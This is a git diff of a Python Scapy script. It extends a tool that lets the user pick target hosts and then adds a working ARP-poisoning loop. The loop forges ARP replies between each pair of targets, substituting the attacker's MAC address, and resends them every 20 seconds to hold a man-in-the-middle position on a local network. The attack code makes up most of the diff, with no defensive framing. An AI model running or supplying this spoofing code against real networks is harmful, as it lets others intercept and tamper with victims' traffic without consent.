@@ -60,25 +60,41 @@ else:
         target.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
 #print(target)
 
-host = []
-#now we will select the hosts (= the other side of the targets)
-mult_target = raw_input("Do you want to select hosts manually (y) or select all IP's automatically (n): ")
-#case user manually select hosts
+target2 = []
+#now we will select the target2
+mult_target = raw_input("Do you want to select target2 manually (y) or select all IP's automatically (n): ")
+#case user manually selects target2
 if(mult_target == "y"):
-    print("Enter the index nr of the host you want to add to the host list, to quit entering input 'quit'")
+    print("Enter the index nr of the target you want to add to the target2 list, to quit entering input 'quit'")
     input = ""
     while(input != "quit"):
         input = raw_input()
         if(input != "quit"):
             inputInt = int(input)
-            host.append({"ip": ips_used[inputInt][1][ARP].psrc, "mac": ips_used[inputInt][1][ARP].hwsrc})
+            target2.append({"ip": ips_used[inputInt][1][ARP].psrc, "mac": ips_used[inputInt][1][ARP].hwsrc})
 else:
     for packet_sent, packet_received in ips_used:
-        host.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
+        target2.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
 #print(host)
 
 #start the actual proofing
 print("Now we will start the ARP poisoning")
+#mac address of the attacker
 ownMAC = get_if_hwaddr(interface)
-print(ownMAC)
-print(ips_used[0][0][ARP].hwsrc)
+
+#now we will create the ARP packets which will poison the targets. We will assume for now that it is bidirection poisoning
+try:
+    while True:
+        for tar1 in target:
+            for tar2 in target2:
+                if((tar1["ip"] != tar2["ip"]) and (tar1["mac"] != tar2["mac"])):
+                    arp_packet1 = Ether(src=ownMAC) / ARP(psrc=tar2["ip"], hwsrc=ownMAC, pdst=tar1["ip"], hwdst=tar1["mac"]) 
+                    sendp(arp_packet1, iface=interface)
+                    arp_packet2 = Ether(src=ownMAC) / ARP(psrc=tar1["ip"], hwsrc=ownMAC, pdst=tar2["ip"], hwdst=tar2["mac"])
+                    sendp(arp_packet2, iface=interface)
+        #waits 20 seconds before the next spoof
+        time.sleep(20)
+#cancel the arp poisonining by pressing ctrl c
+except KeyboardInterrupt:
+    print("spoofing cancelled")
+
